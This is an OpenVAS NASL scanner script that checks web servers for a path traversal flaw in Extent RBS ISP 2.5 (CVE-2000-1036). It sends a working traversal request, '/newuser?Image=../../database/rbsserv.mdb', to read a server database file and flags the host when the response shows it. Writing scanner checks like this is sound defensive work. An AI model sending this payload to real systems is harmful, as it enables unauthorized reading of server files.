# OpenVAS Vulnerability Test
# $Id: rbs.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: Extent RBS ISP
#
# Authors:
# Zorgon <zorgon@linuxstart.com>
#
# Copyright:
# Copyright (C) 2000 Zorgon <zorgon@linuxstart.com>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The 'Extent RBS ISP 2.5' software is installed. This 
software has a well known security flaw that lets anyone read arbitrary
files with the privileges of the http daemon (root or nobody).";

tag_solution = "remove it or patch it (http://www.extent.com/solutions/down_prod.shtml)";

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.10521");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(1704);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_cve_id("CVE-2000-1036");
 
 name = "Extent RBS ISP";
 script_name(name);
 




 
 
 script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
 
 script_copyright("This script is Copyright (C) 2000 Zorgon <zorgon@linuxstart.com>");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("find_service.nasl", "no404.nasl");
 script_require_ports("Services/www",80);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");
port = get_http_port(default:80);

res = is_cgi_installed_ka(port:port, item:"/newuser");
if(res){
 req = string("/newuser?Image=../../database/rbsserv.mdb");
 req = http_get(item:req, port:port);
 soc = http_open_socket(port);
 send(socket:soc, data:req);
 buf = http_recv(socket:soc);
 http_close_socket(soc);
 if("SystemErrorsPerHour" >< buf)	
 	security_message(port);
}
